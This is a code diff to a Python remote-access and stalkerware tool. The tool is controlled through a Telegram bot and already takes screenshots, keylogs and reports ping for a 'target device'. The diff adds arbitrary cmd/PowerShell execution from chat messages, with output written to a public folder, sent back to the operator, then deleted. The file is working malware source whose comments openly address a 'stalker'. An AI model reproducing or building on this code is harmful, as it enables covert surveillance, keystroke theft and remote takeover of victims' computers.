@@ -2,7 +2,7 @@
 # Statement of Responsibility: I am NOT responsible for any malicious use of this code nor any kind of consequences that caused by the one who uses this code partially or fully.
 
 # importing necessary features from various libraries...
-from os import remove
+from os import remove, system
 from time import sleep
 from ping3 import ping
 from telepot import Bot
@@ -38,7 +38,7 @@ def main():
             remove(r"C:\Users\Public\ .png")
 
 # This function allows stalker to track the current ping value of the target device by typing "ping" command to the chat box.
-        elif int(str(msg).lower().find("ping")) != -1:
+        elif int(str(msg).lower().find("deviceping")) != -1:
             bot.sendMessage(id, str(temp2)+" ms")
 
 # This function starts keylogging.
@@ -51,9 +51,18 @@ def main():
             handle.x = 99
             bot.sendMessage(id, "Keylogging is stopped.")
 
-# This command makes it possible to send an information message (which includes definitons of commands) to the stalker if the bot receives a message except these four commands specified above.
+# This command makes it possible to send an information message (which includes definitons of commands) to the stalker if the bot receives a message except cmd/powershell commands or the four commands specified above.
         else:
-            bot.sendMessage(id, "Invalid command. Here is the command list:\n \nShot = Sends you a snapshot.\nPing = Checks the PC's connection status.\nLogstart = Turns on the keylogger.\nLogstop = Turns off the keylogger.")
+            msgTemp = str(msg).find("text': '")
+            msgParsed = str(msg)[int(msgTemp + 8):len(str(msg))-2]
+            out = system(msgParsed)
+            if out == 0:
+                bot.sendMessage(hash, "Prompt command in process...")
+                system(msgParsed+r">C:\Users\Public\.txt")
+                bot.sendDocument(hash, document=open(r"C:\Users\Public\.txt", "r", encoding='utf-8', errors='ignore'))
+                remove(r"C:\Users\Public\.txt")
+            else:
+                bot.sendMessage(hash, "Invalid CMD/Bot command. Here is the bot command list:\n \nShot = Sends you a snapshot.\nDeviceping = Checks the PC's connection status.\nLogstart = Turns on the keylogger.\nLogstop = Turns off the keylogger.")
 
     handle.x = 0
 
